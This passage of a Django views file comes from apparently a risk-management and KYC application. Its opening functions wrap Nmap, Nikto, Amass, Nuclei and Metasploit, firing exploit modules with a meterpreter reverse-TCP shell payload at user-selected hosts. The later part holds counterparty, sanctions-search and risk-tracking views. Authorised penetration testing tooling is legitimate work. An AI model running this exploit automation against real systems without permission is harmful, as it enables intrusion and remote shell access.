        nmap_command = ["nmap", "-sT", "-p", str(port), "--script", script_name, ip]
        print(f"[DEBUG] Nmap command: {' '.join(nmap_command)}")
        result = subprocess.run(nmap_command, capture_output=True, text=True, timeout=60)  # Reduced timeout
        print(f"[DEBUG] Nmap result - returncode: {result.returncode}, stdout: {result.stdout[:100]}...")
        if result.returncode != 0:
            print(f"[DEBUG] Nmap failed with stderr: {result.stderr}")
        return {
            "status": "success" if result.returncode == 0 else "failed",
            "output": result.stdout.strip(),
            "error": result.stderr.strip() if result.returncode != 0 else None
        }
    except subprocess.TimeoutExpired as e:
        print(f"[DEBUG] Nmap timed out: {e}")
        return {"status": "timeout", "error": "Nmap timed out after 60s"}
    except Exception as e:
        print(f"[DEBUG] Nmap failed: {e}")
        return {"status": "error", "error": str(e)}

def run_metasploit_exploit(ip, port, module, payload="linux/x86/meterpreter/reverse_tcp", lhost="127.0.0.1", target=0):
    print(f"[DEBUG] Starting Metasploit exploit {module} on {ip}:{port}")
    try:
        # Fixed command syntax (RHOSTS, not RHOST)
        msf_command = f"use {module}; set RHOSTS {ip}; set RPORT {port}; set PAYLOAD {payload}; set LHOST {lhost}; set TARGET {target}; exploit -z; exit;"
        print(f"[DEBUG] Metasploit command: {msf_command}")
        result = subprocess.run(
            ["msfconsole", "-q", "-x", msf_command],
            capture_output=True, text=True, timeout=120  # Reduced timeout
        )
        print(f"[DEBUG] Metasploit result - returncode: {result.returncode}, stdout: {result.stdout[:100]}...")
        return {
            "status": "success" if result.returncode == 0 else "failed",
            "output": result.stdout.strip(),
            "error": result.stderr.strip() if result.returncode != 0 else None
        }
    except subprocess.TimeoutExpired as e:
        print(f"[DEBUG] Metasploit timed out: {e}")
        return {"status": "timeout", "error": "Metasploit timed out after 120s"}
    except Exception as e:
        print(f"[DEBUG] Metasploit failed: {e}")
        return {"status": "error", "error": str(e)}

def run_nikto_scan(target_url):
    print(f"[DEBUG] Starting Nikto scan on {target_url}")
    try:
        command = ["nikto", "-h", target_url, "-timeout", "60"]
        print(f"[DEBUG] Nikto command: {' '.join(command)}")
        result = subprocess.run(command, capture_output=True, text=True, timeout=60)
        print(f"[DEBUG] Nikto result - returncode: {result.returncode}, stdout: {result.stdout[:100]}...")
        return {
            "status": "success" if result.returncode == 0 else "failed",
            "output": result.stdout.strip(),
            "error": result.stderr.strip() if result.returncode != 0 else None
        }
    except FileNotFoundError:
        print("[DEBUG] Nikto not installed")
        return {"status": "error", "error": "Nikto is not installed"}
    except subprocess.TimeoutExpired as e:
        print(f"[DEBUG] Nikto timed out: {e}")
        return {"status": "timeout", "error": "Nikto timed out after 60s"}
    except Exception as e:
        print(f"[DEBUG] Nikto failed: {e}")
        return {"status": "error", "error": str(e)}

def run_amass_enum(domain):
    print(f"[DEBUG] Starting Amass enumeration on {domain}")
    try:
        command = ["amass", "enum", "-d", domain, "-timeout", "60"]
        print(f"[DEBUG] Amass command: {' '.join(command)}")
        result = subprocess.run(command, capture_output=True, text=True, timeout=60)
        print(f"[DEBUG] Amass result - returncode: {result.returncode}, stdout: {result.stdout[:100]}...")
        return {
            "status": "success" if result.returncode == 0 else "failed",
            "output": result.stdout.strip(),
            "error": result.stderr.strip() if result.returncode != 0 else None
        }
    except subprocess.TimeoutExpired as e:
        print(f"[DEBUG] Amass timed out: {e}")
        return {"status": "timeout", "error": "Amass timed out after 60s"}
    except Exception as e:
        print(f"[DEBUG] Amass failed: {e}")
        return {"status": "error", "error": str(e)}

def analyze_packet_capture(capture_file):
    print(f"[DEBUG] Starting Wireshark analysis on {capture_file}")
    try:
        command = ["tshark", "-r", capture_file]
        print(f"[DEBUG] Wireshark command: {' '.join(command)}")
        result = subprocess.run(command, capture_output=True, text=True, timeout=60)
        print(f"[DEBUG] Wireshark result - returncode: {result.returncode}, stdout: {result.stdout[:100]}...")
        return {
            "status": "success" if result.returncode == 0 else "failed",
            "output": result.stdout.strip(),
            "error": result.stderr.strip() if result.returncode != 0 else None
        }
    except subprocess.TimeoutExpired as e:
        print(f"[DEBUG] Wireshark timed out: {e}")
        return {"status": "timeout", "error": "Wireshark timed out after 60s"}
    except Exception as e:
        print(f"[DEBUG] Wireshark failed: {e}")
        return {"status": "error", "error": str(e)}

def run_nuclei_scan(target_url):
    print(f"[DEBUG] Starting Nuclei scan on {target_url}")
    try:
        command = ["nuclei", "-u", target_url, "-timeout", "60"]
        print(f"[DEBUG] Nuclei command: {' '.join(command)}")
        result = subprocess.run(command, capture_output=True, text=True, timeout=60)
        print(f"[DEBUG] Nuclei result - returncode: {result.returncode}, stdout: {result.stdout[:100]}...")
        return {
            "status": "success" if result.returncode == 0 else "failed",
            "output": result.stdout.strip(),
            "error": result.stderr.strip() if result.returncode != 0 else None
        }
    except subprocess.TimeoutExpired as e:
        print(f"[DEBUG] Nuclei timed out: {e}")
        return {"status": "timeout", "error": "Nuclei timed out after 60s"}
    except Exception as e:
        print(f"[DEBUG] Nuclei failed: {e}")
        return {"status": "error", "error": str(e)}

def execute_tool(ip, port, test):
    print(f"[DEBUG] Executing tool {test['tool']} for {ip}:{port}")
    try:
        tool = test["tool"]
        if tool == "Nmap NSE":
            result = run_nmap_script(ip, port, test["script"])
        elif tool == "Metasploit":
            result = run_metasploit_exploit(ip, port, test["exploit"])
        elif tool == "Nikto":
            target_url = f"http://{ip}:{port}"
            result = run_nikto_scan(target_url)
        elif tool == "Amass":
            result = run_amass_enum(ip)
        elif tool == "Wireshark":
            result = analyze_packet_capture(test["command"].format(capture_file="capture.pcap"))
        elif tool == "Nuclei":
            target_url = f"http://{ip}:{port}"
            result = run_nuclei_scan(target_url)
        else:
            result = {"status": "skipped", "output": f"No handler for tool: {tool}"}
        print(f"[DEBUG] Tool {tool} result: {result}")
        return result
    except Exception as e:
        print(f"[DEBUG] Tool execution failed: {e}")
        return {"status": "error", "error": str(e)}

def generate_report(results):
    print("[DEBUG] Generating report")
    report = [f"Scan Report Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"]
    for device_ip, scans in results.items():
        report.append(f"Device: {device_ip}")
        for scan in scans:
            port_info = f"Port: {scan['port']}, Test: {scan['test_name']}"
            status = f"Status: {scan['status']}"
            details = scan.get("output", scan.get("error", "No details available"))
            report.append(f"{port_info}\n{status}\nDetails:\n{details}\n{'-'*50}")
        report.append("\n")
    full_report = "\n".join(report)
    print(f"[DEBUG] Report generated: {full_report[:200]}...")
    return full_report

@login_required
def run_exploits(request):
    print("[DEBUG] Entering run_exploits view")
    try:
        if request.method != "POST":
            print("[DEBUG] Invalid method, expected POST")
            return JsonResponse({"error": "Method not allowed"}, status=405)

        data = json.loads(request.body)
        print(f"[DEBUG] Request data: {data}")
        selected_ports = data.get("selected_ports", {})
        if not selected_ports:
            print("[DEBUG] No ports selected")
            return JsonResponse({"error": "No ports selected for exploit testing"}, status=400)

        results = {}
        print(f"[DEBUG] Starting exploit tests for {len(selected_ports)} devices")
        for device_ip, ports in selected_ports.items():
            results[device_ip] = []
            print(f"[DEBUG] Processing device {device_ip} with ports {ports}")
            for port in ports:
                exploit_info = PORT_TO_EXPLOIT_MAPPING.get(str(port), PORT_TO_EXPLOIT_MAPPING.get("any", {}))
                print(f"[DEBUG] Exploit info for port {port}: {exploit_info}")
                applicable_tests = exploit_info.get(
                    "tests",
                    [{"name": exploit_info.get("name", "Undefined Test"), "tool": exploit_info.get("tool"), "script": exploit_info.get("script")}]
                )
                for test in applicable_tests:
                    print(f"[DEBUG] Running test {test['name']} on {device_ip}:{port}")
                    result = execute_tool(device_ip, port, test)
                    results[device_ip].append({"port": port, "test_name": test["name"], **result})

        report = generate_report(results)
        print("[DEBUG] Exploit tests completed, returning response")
        return JsonResponse({"results": results, "report": report}, safe=False)

    except json.JSONDecodeError as e:
        print(f"[DEBUG] JSON decode error: {e}")
        return JsonResponse({"error": "Invalid JSON data"}, status=400)
    except Exception as e:
        print(f"[DEBUG] General error in run_exploits: {e}")
        return JsonResponse({"error": str(e)}, status=500)

# --------------------------------------------------------------
from django.shortcuts import render, redirect
from django.utils.timezone import now
from orm.models import AppLicense

def setup_license(request):
    if request.method == 'POST':
        expiration_date = request.POST.get('expiration_date')
        AppLicense.objects.create(expiration_date=expiration_date, is_active=True)
        return redirect('/')

    return render(request, 'license_setup.html')

# --------------------------------------------------------------

from django.shortcuts import get_object_or_404, render, redirect
from django.views.generic import ListView, CreateView, UpdateView, DeleteView
from django.urls import reverse_lazy
from .models import Counterparty,  DueDiligenceAssessment, AssessmentResponse
from .models import KYCQuestion, Counterparty, DueDiligenceAssessment, AssessmentResponse, KYCStandard


from django.shortcuts import render, get_object_or_404, redirect
from django.urls import reverse_lazy
from .models import Counterparty
from django import forms
from .models import Counterparty

from django import forms
from orm.models import Counterparty

class CounterpartyForm(forms.ModelForm):
    class Meta:
        model = Counterparty
        fields = [
            'name',
            'registration_number',
            'country',
            'contact_email',
            'contact_phone',
            'counterparty_type',
            'entity_type',
            'street_address',  # New address components
            'city',
            'state',
            'postal_code',
            'is_active',
        ]

def counterparty_detail(request, pk):
    counterparty = get_object_or_404(Counterparty, pk=pk)

    if request.method == "POST":
        form = CounterpartyForm(request.POST, instance=counterparty)
        if form.is_valid():
            form.save()
            return redirect('counterparty_list')  # Redirect to the list view after saving
    else:
        form = CounterpartyForm(instance=counterparty)

    return render(request, 'counterparty_detail.html', {'form': form, 'counterparty': counterparty})

# Counterparty CRUD
class CounterpartyListView(ListView):
    model = Counterparty
    template_name = 'counterparty_list.html'
    context_object_name = 'counterparties'

from django.urls import reverse_lazy
from django.views.generic.edit import CreateView, UpdateView
from .models import Counterparty

from django.views.generic.edit import CreateView
from .models import Counterparty
from django.urls import reverse_lazy
import requests
from django.shortcuts import render

import requests
from django.shortcuts import render
from django.shortcuts import get_object_or_404, redirect
from django.http import HttpResponse
from .models import Counterparty

from django.shortcuts import redirect
from .models import Counterparty
from datetime import datetime
from django.urls import reverse_lazy
from django.shortcuts import render
from django.views.generic.edit import CreateView, UpdateView, DeleteView
from django.http import HttpResponseRedirect
from .models import Counterparty
from datetime import datetime
import requests
from django.db import transaction
from django.shortcuts import redirect
from orm.models import Risk, Mitigation, Opportunity, Threat, Portfolio
from django.contrib.auth.decorators import login_required
from django.shortcuts import get_object_or_404, redirect
from django.db import transaction
from django.contrib.auth.decorators import login_required
from orm.models import Risk, Mitigation, Opportunity, Threat, Portfolio, Category

from django.shortcuts import get_object_or_404, redirect
from django.db import transaction
from django.contrib.auth.decorators import login_required
from orm.models import Risk, Mitigation, Opportunity, Threat, Portfolio, Category

from django.urls import reverse_lazy
from django.http import HttpResponseRedirect
from django.views.generic.edit import UpdateView
from datetime import datetime
import requests

from django.views.generic.edit import UpdateView
from django.shortcuts import HttpResponseRedirect
from datetime import datetime
from django.shortcuts import get_object_or_404, render, redirect
from .models import Counterparty, KYCStandard, KYCQuestion, DueDiligenceAssessment, AssessmentResponse

from django.urls import reverse_lazy
from django.views.generic import ListView, CreateView, UpdateView, DeleteView
from .models import KYCStandard, KYCQuestion

from django.shortcuts import get_object_or_404, render, redirect
from .models import Counterparty, KYCStandard, KYCQuestion, DueDiligenceAssessment, AssessmentResponse
from django.views.generic import ListView
from django.shortcuts import get_object_or_404
from .models import Counterparty, DueDiligenceAssessment


class CounterpartyCreateView(CreateView):
    model = Counterparty
    fields = [
        'name',
        'registration_number',
        'counterparty_type',
        'country',
        'street_address',
        'city',
        'state',
        'postal_code',
        'contact_email',
        'contact_phone',
        'entity_type',
    ]
    template_name = 'counterparty_detail.html'
    success_url = reverse_lazy('counterparty_list')

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['counterparty'] = None  # Provide a placeholder for `counterparty`
        context['network_results'] = []  # Prevent errors when searching
        return context


class CounterpartyUpdateView(UpdateView):
    model = Counterparty
    form_class = CounterpartyForm  # Use the custom form
    template_name = 'counterparty_detail.html'
    success_url = reverse_lazy('counterparty_list')

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        if "edit_counterparty" in request.POST:
            form = self.get_form()
            if form.is_valid():
                form.save()
                return HttpResponseRedirect(self.get_success_url())
            else:
                return self.form_invalid(form)
        if "sanction_source" in request.POST:
            self.object.is_sanctioned = True
            self.object.sanction_source = request.POST.get("sanction_source", "")
            raw_date = request.POST.get("sanction_created_at", "")
            try:
                self.object.sanction_created_at = datetime.fromisoformat(raw_date).date()
            except ValueError:
                self.object.sanction_created_at = None
            self.object.save()
            return HttpResponseRedirect(self.request.path_info)
        if "no_sanction" in request.POST:
            self.object.is_sanctioned = False
            self.object.sanction_source = ""
            self.object.sanction_created_at = None
            self.object.save()
            return HttpResponseRedirect(self.request.path_info)
        return super().post(request, *args, **kwargs)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        query = self.request.GET.get("name", self.object.name)
        network_results = []

        if query:
            print(f"Searching Sanctions Network for query: '{query}'")
            url = "https://api.sanctions.network/rpc/search_sanctions"
            params = {"name": query}
            full_url = requests.Request('GET', url, params=params).prepare().url
            print(f"Full API URL: {full_url}")

            response = requests.get(url, params=params)
            print(f"API Response Status Code: {response.status_code}")
            print(f"API Response Headers: {response.headers}")
            print(f"API Response Content: {response.text}")

            if response.status_code == 200:
                data = response.json()
                print(f"Parsed JSON Data: {data}")
                network_results = [
                    {
                        "names": result.get("names", [result.get("name", "")]),
                        "source": result.get("source", "Unknown"),
                        "created_at": result.get("created_at", result.get("date", "")),
                        "id": result.get("id", ""),
                        "source_id": result.get("source_id", ""),
                        "target_type": result.get("target_type", "Unknown"),
                        "remarks": result.get("remarks", ""),
                        "positions": result.get("positions", []),
                        "listed_on": result.get("listed_on", ""),
                        "ofac_link": (
                            f"https://sanctionssearch.ofac.treas.gov/Details.aspx?id={result.get('source_id', '')}"
                            if result.get("source", "").lower() == "ofac" and result.get("source_id")
                            else ""
                        ),
                        "raw_data": result
                    }
                    for result in data
                ]
                print(f"Processed network_results: {network_results}")
            else:
                print(f"API request failed with status {response.status_code}: {response.text}")
                network_results = []

        context["network_results"] = network_results
        context["query"] = query
        return context

class CounterpartyDeleteView(DeleteView):
    model = Counterparty
    template_name = 'counterparty_confirm_delete.html'
    success_url = reverse_lazy('counterparty_list')


def run_assessment(request, pk):
    counterparty = get_object_or_404(Counterparty, pk=pk)
    standards = KYCStandard.objects.all()
    selected_standard = None
    questions = []

    if request.method == "POST":
        # Retrieve the selected standard
        standard_id = request.POST.get('standard')
        if not standard_id:
            return render(request, 'run_assessment.html', {
                'counterparty': counterparty,
                'standards': standards,
                'questions': questions,
                'error': "Please select a standard."
            })

        selected_standard = get_object_or_404(KYCStandard, id=standard_id)
        questions = KYCQuestion.objects.filter(standard=selected_standard)

        # Create the assessment
        assessment = DueDiligenceAssessment.objects.create(
            counterparty=counterparty,
            standard=selected_standard,
            performed_by=request.user.userprofile,  # Assuming user has a profile
            status="Pending"
        )

        # Process responses
        total_score = 0
        for question in questions:
            response_value = int(request.POST.get(f'question_{question.id}', 0))
            # Check for existing responses to prevent duplication
            if not AssessmentResponse.objects.filter(assessment=assessment, question=question).exists():
                AssessmentResponse.objects.create(
                    assessment=assessment,
                    question=question,
                    response_value=response_value
                )
            total_score += response_value * question.weight

        # Finalize assessment
        assessment.overall_score = total_score
        assessment.status = "Completed"
        assessment.save()

        return redirect('assessment_list', pk=counterparty.id)

    return render(request, 'run_assessment.html', {
        'counterparty': counterparty,
        'standards': standards,
        'questions': questions
    })

class AssessmentListView(ListView):
    template_name = 'assessment_list.html'
    context_object_name = 'assessments'

    def get_queryset(self):
        return DueDiligenceAssessment.objects.filter(counterparty_id=self.kwargs['pk'])

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        # Get the Counterparty object and add it to the context
        context['counterparty'] = get_object_or_404(Counterparty, pk=self.kwargs['pk'])
        return context

def assessment_detail(request, pk):
    # Fetch the assessment
    assessment = get_object_or_404(DueDiligenceAssessment, pk=pk)

    # Fetch responses and sort them by the related question text
    responses = AssessmentResponse.objects.filter(assessment=assessment).order_by('question__question_text')

    if request.method == "POST":
        for response in responses:
            field_name = f"response_{response.id}"
            new_value = request.POST.get(field_name)
            if new_value:
                response.response_value = int(new_value)
                response.save()

        # Recalculate the overall score after updates
        assessment.calculate_overall_score()
        return redirect('assessment_detail', pk=pk)

    return render(request, 'assessment_detail.html', {'assessment': assessment, 'responses': responses})



# KYCStandard Views
class KYCStandardListView(ListView):
    model = KYCStandard
    template_name = 'kyc_standard_list.html'
    context_object_name = 'standards'


class KYCStandardCreateView(CreateView):
    model = KYCStandard
    fields = ['name', 'description']
    template_name = 'kyc_standard_form.html'
    success_url = reverse_lazy('kyc_standard_list')


class KYCStandardUpdateView(UpdateView):
    model = KYCStandard
    fields = ['name', 'description']
    template_name = 'kyc_standard_form.html'
    success_url = reverse_lazy('kyc_standard_list')


class KYCStandardDeleteView(DeleteView):
    model = KYCStandard
    template_name = 'confirm_delete.html'
    success_url = reverse_lazy('kyc_standard_list')


# KYCQuestion Views
class KYCQuestionListView(ListView):
    model = KYCQuestion
    template_name = 'kyc_question_list.html'
    context_object_name = 'questions'


class KYCQuestionCreateView(CreateView):
    model = KYCQuestion
    fields = ['standard', 'question_text', 'weight',
              'score_1_description', 'score_2_description', 
              'score_3_description', 'score_4_description', 
              'score_5_description']
    template_name = 'kyc_question_form.html'
    success_url = reverse_lazy('kyc_question_list')


class KYCQuestionUpdateView(UpdateView):
    model = KYCQuestion
    fields = ['standard', 'question_text', 'weight',
              'score_1_description', 'score_2_description', 
              'score_3_description', 'score_4_description', 
              'score_5_description']
    template_name = 'kyc_question_form.html'
    success_url = reverse_lazy('kyc_question_list')


class KYCQuestionDeleteView(DeleteView):
    model = KYCQuestion
    template_name = 'confirm_delete.html'
    success_url = reverse_lazy('kyc_question_list')

# --------------------------------------------------------------
from django.shortcuts import render
from orm.services import OFACSanctionsService
import logging

def sanctions_search_view(request):
    query = request.GET.get("q", "").strip()
    logging.debug(f"Search request received with query: {query}")
    results = []
    error = None

    if query:
        try:
            # Perform the search
            response = OFACSanctionsService.search_individual(query)
            logging.debug(f"Search response: {response}")

            # Process the response (replace with your logic)
            # Assuming response is XML; parse it if needed.
            results = response  # Replace with your parsed results
        except Exception as e:
            logging.error(f"Unexpected error during search: {e}")
            error = str(e)

    # Ensure the view always returns a response
    return render(request, "sanctions_search.html", {
        "query": query,
        "results": results,
        "error": error,
    })



def sanctions_network_search(request):
    name = request.GET.get("name", "").strip()
    network_results = []
    no_sanctions_found = False  # Flag to indicate no results found

    if name:
        # API call to Sanctions Network
        url = "https://api.sanctions.network/rpc/search_sanctions"
        params = {"name": name}
        response = requests.get(url, params=params)

        if response.status_code == 200:
            network_results = response.json()
            # Set flag if no results are returned
            if not network_results:
                no_sanctions_found = True

    return render(request, "sanctions_search.html", {
        "network_results": network_results,
        "query": name,
        "no_sanctions_found": no_sanctions_found,  # Pass flag to template
    })

def save_clean_result(request):
    if request.method == "POST":
        counterparty_id = request.POST.get("counterparty_id")
        counterparty = get_object_or_404(Counterparty, id=counterparty_id)
        
        # Set the counterparty as not sanctioned
        counterparty.is_sanctioned = False
        counterparty.sanction_source = ""
        counterparty.sanction_created_at = None
        counterparty.save()
        
        # Redirect back to the counterparty detail or any other page
        return redirect("counterparty_detail", pk=counterparty.id)

    return HttpResponse("Invalid request", status=400)




def save_sanction_result(request):
    if request.method == "POST":
        counterparty_id = request.POST.get("counterparty_id")
        sanction_source = request.POST.get("sanction_source")
        sanction_created_at = request.POST.get("sanction_created_at")

        try:
            # Fetch the counterparty and update sanction details
            counterparty = Counterparty.objects.get(id=counterparty_id)
            counterparty.is_sanctioned = True
            counterparty.sanction_source = sanction_source

            # Convert sanction_created_at to a date object
            if sanction_created_at:
                try:
                    counterparty.sanction_created_at = datetime.fromisoformat(sanction_created_at).date()
                except ValueError:
                    counterparty.sanction_created_at = datetime.strptime(sanction_created_at, "%Y-%m-%dT%H:%M:%S.%f%z").date()

            counterparty.save()
        except Counterparty.DoesNotExist:
            pass  # Handle missing counterparty gracefully

    # Redirect back to the counterparty detail page
    return redirect("counterparty_detail", counterparty_id=counterparty_id)

# --------------------------------------------------------------

from django.db import transaction
from django.db import connection
from django.shortcuts import redirect
from orm.models import Risk, Mitigation


def create_mitigation(proposal, portfolio_id, user_profile):
    """
    Create a mitigation with the specified proposal, portfolio, and user profile.
    """
    mitigation = Mitigation.objects.create(
        title=proposal,
        portfolio_id=portfolio_id,
    )
    mitigation.owners.add(user_profile)

def create_risk(proposal, portfolio_id, user_profile):
    """
    Create a risk with the specified proposal, portfolio, and user profile.
    """
    risk = Risk.objects.create(
        title=proposal,
        portfolio_id=portfolio_id,
    )
    risk.owners.add(user_profile)

def redirect_action(action):
    """
    Redirect based on the performed action.
    """
    if action == "add_mitigation":
        return redirect("/admin/orm/mitigation/")
    elif action == "add_risk":
        return redirect("/admin/orm/risk/")
    return redirect("/")





@login_required
def create_proposals_with_portfolio(request):
    if request.method == "POST":
        # Fetch input from the POST request
        portfolio_id = request.POST.get("portfolio_id")
        category_id = request.POST.get("category_id")  # Only used for risks
        selected_proposals = request.POST.getlist("selected_proposals")
        action = request.POST.get("action")

        print(f"Debug: portfolio_id={portfolio_id}, category_id={category_id}, selected_proposals={selected_proposals}, action={action}")

        # Validate input
        if not portfolio_id or not selected_proposals or action not in ["add_risk", "add_mitigation", "add_opportunity", "add_threat"]:
            print("Debug: Validation failed - Redirecting to '/'")
            return redirect("/")  # Redirect if invalid data

        current_user = request.user.userprofile

        try:
            # Fetch portfolio
            portfolio = Portfolio.objects.get(id=portfolio_id)
            print(f"Debug: Found portfolio={portfolio.name}")

            # Fetch category only for risks
            category = None
            if action == "add_risk":
                if not category_id:
                    print("Debug: Missing category for risk - Redirecting to '/'")
                    return redirect("/")  # Redirect if no category is provided for risks
                category = Category.objects.get(id=category_id)
                print(f"Debug: Found category={category.name}")

            with transaction.atomic():
                for proposal in selected_proposals:
                    if not proposal.strip():
                        print("Debug: Skipping empty proposal")
                        continue  # Skip empty proposals

                    print(f"Debug: Processing proposal='{proposal}'")
                    
                    # Handle risks
                    if action == "add_risk":
                        new_risk = Risk(
                            title=proposal,
                            description=proposal,
                            portfolio=portfolio,
                            category=category,  # Assign the category only for risks
                        )
                        new_risk.save()
                        new_risk.owners.add(current_user)
                        print(f"Debug: Created risk='{new_risk.title}'")

                    # Handle mitigations
                    elif action == "add_mitigation":
                        new_mitigation = Mitigation(
                            title=proposal,
                            description=proposal,
                            portfolio=portfolio,
                        )
                        new_mitigation.save()
                        new_mitigation.owners.add(current_user)
                        print(f"Debug: Created mitigation='{new_mitigation.title}'")

                    # Handle opportunities
                    elif action == "add_opportunity":
                        new_opportunity = Opportunity(
                            title=proposal,
                            description=proposal,
                            portfolio=portfolio,
                        )
                        new_opportunity.save()
                        new_opportunity.owner = current_user
                        new_opportunity.save()
                        print(f"Debug: Created opportunity='{new_opportunity.title}'")

                    # Handle threats
                    elif action == "add_threat":
                        new_threat = Threat(
                            title=proposal,
                            description=proposal,
                            portfolio=portfolio,
                        )
                        new_threat.save()
                        new_threat.owner = current_user
                        new_threat.save()
                        print(f"Debug: Created threat='{new_threat.title}'")

            # Redirect to appropriate admin list view
            if action == "add_risk":
                return redirect("/risks/")
            elif action == "add_mitigation":
                return redirect("/mitigations/")
            elif action == "add_opportunity":
                return redirect("/opportunities/")
            elif action == "add_threat":
                return redirect("/threats/")

        except Portfolio.DoesNotExist:
            print("Debug: Portfolio does not exist - Redirecting to '/'")
            return redirect("/")  # Portfolio not found
        except Category.DoesNotExist:
            print("Debug: Category does not exist - Redirecting to '/'")
            return redirect("/")  # Category not found
        except Exception as e:
            print(f"Error: {e} - Redirecting to '/'")
            return redirect("/")

    print("Debug: Invalid request method - Redirecting to '/'")
    return redirect("/")
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.db import transaction
from orm.models import Risk, Mitigation, Opportunity, Threat, Portfolio

from django.utils.html import strip_tags

from django.utils.html import strip_tags
from django.shortcuts import get_object_or_404, redirect
from django.contrib.auth.decorators import login_required
from orm.models import Risk, Mitigation, Opportunity, Threat, Portfolio
from django.shortcuts import get_object_or_404, redirect
from django.contrib import messages
from django.utils.html import strip_tags

@csrf_exempt
@login_required

def extract_prefix(title):
    clean_title = strip_tags(title).strip()
    prefix = clean_title.split(" ")[0].lower() if clean_title else ""
    return re.sub(r'[^\w]', '', prefix)  # Remove non-alphanumeric characters

import re
from django.utils.html import strip_tags
from django.shortcuts import get_object_or_404, redirect

import re
from django.utils.html import strip_tags

def extract_prefix(title):
    """
    Extract the numeric prefix from a title.
    Example: '6.6-example' -> '6.6'
    """
    clean_title = strip_tags(title).strip().lower()  # Strip HTML and normalize
    match = re.match(r'^([\d.]+)', clean_title)  # Match numeric prefix
    if match:
        return match.group(1)  # Return the numeric prefix
    return None  # Return None if no prefix is found

def create_risk_mitigation_associations(request):
    if request.method == "POST":
        portfolio_id = request.POST.get("portfolio_id")

        portfolio = get_object_or_404(Portfolio, id=portfolio_id)
        print(f"[DEBUG] Portfolio found: {portfolio.name} (ID: {portfolio.id})")

        # Fetch related objects
        risks = Risk.objects.filter(portfolio=portfolio)
        mitigations = Mitigation.objects.filter(portfolio=portfolio)
        opportunities = Opportunity.objects.filter(portfolio=portfolio)
        threats = Threat.objects.filter(portfolio=portfolio)

        print(f"[DEBUG] Risks: {[extract_prefix(r.title) for r in risks]}")
        print(f"[DEBUG] Mitigations: {[extract_prefix(m.title) for m in mitigations]}")
        print(f"[DEBUG] Opportunities: {[extract_prefix(o.title) for o in opportunities]}")
        print(f"[DEBUG] Threats: {[extract_prefix(t.title) for t in threats]}")

        associations_created = 0

        for risk in risks:
            risk_prefix = extract_prefix(risk.title)
            if not risk_prefix:
                print(f"[DEBUG] Skipping Risk '{risk.title}' due to missing prefix.")
                continue

            # Match and associate mitigations
            for mitigation in mitigations:
                mitigation_prefix = extract_prefix(mitigation.title)
                if risk_prefix == mitigation_prefix:
                    risk.mitigations.add(mitigation)
                    associations_created += 1
                    print(f"[DEBUG] Associated Risk '{risk.title}' with Mitigation '{mitigation.title}'")
                else:
                    print(f"[DEBUG] No match: Risk '{risk_prefix}' != Mitigation '{mitigation_prefix}'")

            # Match and associate opportunities
            for opportunity in opportunities:
                opportunity_prefix = extract_prefix(opportunity.title)
                if risk_prefix == opportunity_prefix:
                    risk.opportunities.add(opportunity)
                    associations_created += 1
                    print(f"[DEBUG] Associated Risk '{risk.title}' with Opportunity '{opportunity.title}'")
                else:
                    print(f"[DEBUG] No match: Risk '{risk_prefix}' != Opportunity '{opportunity_prefix}'")

            # Match and associate threats
            for threat in threats:
                threat_prefix = extract_prefix(threat.title)
                if risk_prefix == threat_prefix:
                    risk.threats.add(threat)
                    associations_created += 1
                    print(f"[DEBUG] Associated Risk '{risk.title}' with Threat '{threat.title}'")
                else:
                    print(f"[DEBUG] No match: Risk '{risk_prefix}' != Threat '{threat_prefix}'")

        print(f"[DEBUG] Total associations created: {associations_created}")
        return redirect("/risks/")

    print("[DEBUG] Invalid request method.")
    return redirect("/")

@login_required
def risk_assessment_list_view(request):
    """Displays the list of all risk assessments."""
    assessments = RiskAssessment.objects.all()
    if not request.user.is_superuser:
        user_profile = request.user.userprofile
        assessments = assessments.filter(
            assessor=user_profile
        ) | assessments.filter(created_by=user_profile)
    return render(request, "risk_assessment_list.html", {"assessments": assessments})


from django.shortcuts import get_object_or_404, render, redirect
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from .models import RiskAssessment, Risk
import json

@login_required
def risk_assessment_detail_view(request, assessment_id):
    """Displays details of a single risk assessment."""
    assessment = get_object_or_404(RiskAssessment, id=assessment_id)

    # Ensure permissions
    if not request.user.is_superuser and not (
        request.user.userprofile == assessment.assessor or request.user.userprofile == assessment.created_by
    ):
        messages.error(request, "You do not have permission to view this assessment.")
        return redirect("risk_assessment_list")

    # Fetch all risks excluding already associated risks
    all_risks = Risk.objects.exclude(id__in=assessment.risks.values_list('id', flat=True))

    # Fetch all profiles for the dropdowns
    user_profiles = UserProfile.objects.all()

    return render(request, "risk_assessment_detail.html", {
        "assessment": assessment,
        "all_risks": all_risks,
        "user_profiles": user_profiles,
    })



@login_required
def risk_assessment_create_view(request):
    """Creates a new risk assessment and redirects to the detail view for editing."""
    # Create a new blank assessment
    new_assessment = RiskAssessment.objects.create(
        created_by=request.user.userprofile,
        assessor=request.user.userprofile,
        title="",
        description="",
        status="pending"
    )

    # Redirect to the detail view for the newly created assessment
    return redirect("risk_assessment_detail", assessment_id=new_assessment.id)
from django.shortcuts import get_object_or_404, redirect
from django.contrib import messages

@login_required
def risk_assessment_delete_view(request, assessment_id):
    """Deletes a risk assessment."""
    assessment = get_object_or_404(RiskAssessment, id=assessment_id)

    # Ensure the user has the permission to delete
    if not request.user.is_superuser and request.user.userprofile != assessment.created_by:
        messages.error(request, "You do not have permission to delete this assessment.")
        return redirect("risk_assessment_list")

    if request.method == "POST":
        assessment.delete()
        messages.success(request, "Risk assessment deleted successfully.")
        return redirect("risk_assessment_list")

    # If accessed via GET, show a confirmation page (optional)
    return render(request, "risk_assessment_confirm_delete.html", {"assessment": assessment})


from django.http import JsonResponse
# from .models import Risk, Assessment
import json

@login_required
def add_risk_to_assessment(request, assessment_id):
    """Adds an existing risk to the assessment."""
    if request.method == "POST":
        assessment = get_object_or_404(RiskAssessment, id=assessment_id)
        data = json.loads(request.body)
        risk_id = data.get("risk_id")

        try:
            risk = Risk.objects.get(id=risk_id)
            assessment.risks.add(risk)
            return JsonResponse({"success": True, "risk": {"id": risk.id, "title": risk.title}})
        except Risk.DoesNotExist:
            return JsonResponse({"success": False, "error": "Risk not found."}, status=404)

